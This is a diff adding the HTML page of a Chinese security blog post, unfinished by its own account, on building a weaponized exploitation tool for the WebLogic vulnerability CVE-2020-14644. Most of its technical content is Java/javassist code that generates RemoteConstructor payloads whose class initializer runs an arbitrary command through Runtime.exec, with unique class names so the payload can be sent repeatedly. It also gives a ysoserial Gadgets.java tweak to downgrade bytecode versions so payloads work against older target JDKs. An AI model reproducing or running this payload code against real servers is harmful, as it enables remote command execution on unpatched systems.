@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="人间四月芳菲尽，山寺桃花始盛开。  (偷一张女朋友的拍的照片) 0x00 介绍在写武器化的工具中自己遇到了一些问题，问题比较多就慢慢的写文章解决吧。 0x01 Q&amp;A问题： 在CVE-2020-14644中我遇到了第一个问题就是解决defineClass加载的类，不允许同名的问题 如果打一次生成一次恶意的class在加载肯定不优雅。而CVE-2020-14644又是比较不错的攻击载荷(执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weaponization development">
+<meta property="og:url" content="http://example.com/2022/04/22/Weaponization-from-zero-to-one/index.html">
+<meta property="og:site_name" content="一往无前虎山行">
+<meta property="og:description" content="人间四月芳菲尽，山寺桃花始盛开。  (偷一张女朋友的拍的照片) 0x00 介绍在写武器化的工具中自己遇到了一些问题，问题比较多就慢慢的写文章解决吧。 0x01 Q&amp;A问题： 在CVE-2020-14644中我遇到了第一个问题就是解决defineClass加载的类，不允许同名的问题 如果打一次生成一次恶意的class在加载肯定不优雅。而CVE-2020-14644又是比较不错的攻击载荷(执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2022/04/08/LC62QI.md.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2022/04/22/LRUIFx.md.png">
+<meta property="article:published_time" content="2022-04-22T12:58:56.756Z">
+<meta property="article:modified_time" content="2022-04-22T13:03:21.362Z">
+<meta property="article:author" content="Firebasky">
+<meta property="article:tag" content="武器化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/04/08/LC62QI.md.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Weaponization development</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/03/22/Codeql-excavate-Java-quadratic-deserialization/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/22/Weaponization-from-zero-to-one/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&text=Weaponization development"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&is_video=false&description=Weaponization development"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weaponization development&body=Check out this article: http://example.com/2022/04/22/Weaponization-from-zero-to-one/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&name=Weaponization development&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&t=Weaponization development"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Q-amp-A"><span class="toc-number">2.</span> <span class="toc-text">0x01 Q&amp;A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Q-amp-A"><span class="toc-number">3.</span> <span class="toc-text">0x02 Q&amp;A</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Weaponization development
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Firebasky</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-22T12:58:56.756Z" itemprop="datePublished">2022-04-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%AD%A6%E5%99%A8%E5%8C%96/" rel="tag">武器化</a>
+    </div>
+
+
+	  
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><strong>人间四月芳菲尽，山寺桃花始盛开。</strong></p>
+<p><img src="https://s1.ax1x.com/2022/04/08/LC62QI.md.jpg" alt="LC62QI.md.jpg"></p>
+<p>(偷一张女朋友的拍的照片)</p>
+<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>在写武器化的工具中自己遇到了一些问题，问题比较多就慢慢的写文章解决吧。</p>
+<h2 id="0x01-Q-amp-A"><a href="#0x01-Q-amp-A" class="headerlink" title="0x01 Q&amp;A"></a>0x01 Q&amp;A</h2><p>问题：</p>
+<p>在CVE-2020-14644中我遇到了第一个问题就是解决<strong>defineClass加载的类，不允许同名的问题</strong></p>
+<p>如果打一次生成一次恶意的class在加载肯定不优雅。而CVE-2020-14644又是比较不错的攻击载荷(执行java代码并且不出网)</p>
+<p>解决：</p>
+<p>CVE-2020-14644的漏洞原理这里就不介绍了可以看文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/unicodeSec/p/13451993.html">Oracle cve 2020-14644 分析利用以及回显思路</a> </p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213074">Weblogic 远程命令执行漏洞（CVE-2020-14644）分析</a></p>
+<p>这里直接给出代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;payloads.test&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + command.replaceAll(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) + <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">ctClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"><span class="type">String</span> <span class="variable">clazzName</span> <span class="operator">=</span> <span class="string">&quot;payloads.test&quot;</span> + System.nanoTime();</span><br><span class="line">ctClass.setName(clazzName);</span><br><span class="line"><span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">ctClass.defrost();<span class="comment">//冻结</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//生成md5</span></span><br><span class="line"><span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">digest.update(bytes);</span><br><span class="line"><span class="type">byte</span>[] digest1 = digest.digest();</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> ClassIdentity.getDeclaredConstructor(String.class, String.class, String.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">classIdentity</span> <span class="operator">=</span> declaredConstructor.newInstance(<span class="string">&quot;payloads&quot;</span>, clazzName.substring(clazzName.lastIndexOf(<span class="number">46</span>) + <span class="number">1</span>), toHex(digest1));</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">getVersion</span> <span class="operator">=</span> ClassIdentity.getMethod(<span class="string">&quot;getVersion&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">version</span> <span class="operator">=</span> getVersion.invoke(classIdentity);</span><br><span class="line">ctClass.replaceClassName(clazzName,  clazzName + <span class="string">&quot;$&quot;</span> + version);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ClassDefinition.getConstructor(ClassIdentity, <span class="type">byte</span>[].class).newInstance(classIdentity, ctClass.toBytecode());</span><br><span class="line"><span class="type">Object</span> <span class="variable">constructor</span> <span class="operator">=</span> remoteConstructor.getConstructor(ClassDefinition, Object[].class).newInstance(o, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="keyword">return</span> constructor;</span><br><span class="line"></span><br><span class="line">------------------------------------</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span>[] HEX = <span class="string">&quot;0123456789ABCDEF&quot;</span>.toCharArray();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHex</span><span class="params">(<span class="type">byte</span>[] ab)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">cb</span> <span class="operator">=</span> ab.length;</span><br><span class="line">    <span class="type">char</span>[] ach = <span class="keyword">new</span> <span class="title class_">char</span>[cb * <span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">ofb</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; ofb &lt; cb; ++ofb) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> ab[ofb] &amp; <span class="number">255</span>;</span><br><span class="line">        ach[var4++] = HEX[n &gt;&gt; <span class="number">4</span>];</span><br><span class="line">        ach[var4++] = HEX[n &amp; <span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(ach);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意如果是注入回显的木马可以使用下面的代码，至少不需要通过javassist生成代码（至少自己不喜欢）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">long</span> <span class="variable">FLAGS</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;payloads.RemoteImpl&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">clazzName</span> <span class="operator">=</span> <span class="string">&quot;payloads.RemoteImpl&quot;</span> + FLAGS;</span><br><span class="line">ctClass.setName(clazzName);</span><br><span class="line"><span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">ctClass.defrost();<span class="comment">//冻结</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-Q-amp-A"><a href="#0x02-Q-amp-A" class="headerlink" title="0x02 Q&amp;A"></a>0x02 Q&amp;A</h2><p>问题：</p>
+<p>在写利用工具的时候依赖包的环境需要jdk8+，但是生成payload的时候需要注意一个问题就是加载字节码的时候不能高于目标环境的jdk版本，也就是说如果目标jdk是6，我们使用工具生成的payload并且发送payload是打不通的(只是对于加载字节码的payload)。这时候我们就需要修改class的jdk版本</p>
+<p>解决：</p>
+<p>如下修改yso中的代码 Gadgets.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] bytesVersion=&#123;<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">58</span>,<span class="number">59</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LRUIFx"><img src="https://s1.ax1x.com/2022/04/22/LRUIFx.md.png" alt="LRUIFx.md.png"></a></p>
+<p>可参考：<a target="_blank" rel="noopener" href="https://gist.github.com/Firebasky/61e407e7d0ed9a453726b41e809d94d4">https://gist.github.com/Firebasky/61e407e7d0ed9a453726b41e809d94d4</a></p>
+<hr>
+<p>未完待续…….</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Q-amp-A"><span class="toc-number">2.</span> <span class="toc-text">0x01 Q&amp;A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Q-amp-A"><span class="toc-number">3.</span> <span class="toc-text">0x02 Q&amp;A</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/22/Weaponization-from-zero-to-one/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&text=Weaponization development"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&is_video=false&description=Weaponization development"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weaponization development&body=Check out this article: http://example.com/2022/04/22/Weaponization-from-zero-to-one/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&title=Weaponization development"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&name=Weaponization development&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/22/Weaponization-from-zero-to-one/&t=Weaponization development"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    Firebasky
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
